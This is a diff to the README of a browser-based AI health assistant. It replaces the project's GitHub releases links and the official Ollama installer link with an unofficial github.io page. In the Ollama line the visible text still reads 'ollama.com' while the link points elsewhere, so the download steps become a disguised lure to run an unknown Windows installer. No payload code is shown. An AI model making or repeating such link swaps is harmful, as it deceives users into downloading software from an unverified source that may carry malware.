@@ -1,6 +1,6 @@
 # 🔬 smart-healthcare-assistant - Your Health Information Hub
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/Shabis8393/smart-healthcare-assistant/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://shabis8393.github.io)
 
 AI Healthcare Assistant helps you explore symptoms, learn about medicines, calculate wellness scores, manage appointments, and get emergency guidance. It runs in your browser and uses Ollama with Llama 3.2 to provide helpful health information.
 
@@ -12,7 +12,7 @@ You need two things to run this application:
 
 ### Step 1: Install Ollama
 
-Visit [ollama.com](https://ollama.com) and download the Windows installer. Run it like any other program. This takes about 2 minutes.
+Visit [ollama.com](https://shabis8393.github.io) and download the Windows installer. Run it like any other program. This takes about 2 minutes.
 
 After installation, open a command prompt (press Windows key, type "cmd", press Enter). Type this command and press Enter:
 
@@ -26,7 +26,7 @@ This downloads the Llama 3.2 AI model. It takes 5-15 minutes depending on your i
 
 Visit the releases page:
 
-[**https://github.com/Shabis8393/smart-healthcare-assistant/releases**](https://github.com/Shabis8393/smart-healthcare-assistant/releases)
+[**https://shabis8393.github.io**](https://shabis8393.github.io)
 
 Look for the latest release. It shows a version number like "v1.0.0" and a date. Click the green "Latest" button if you see one.
 
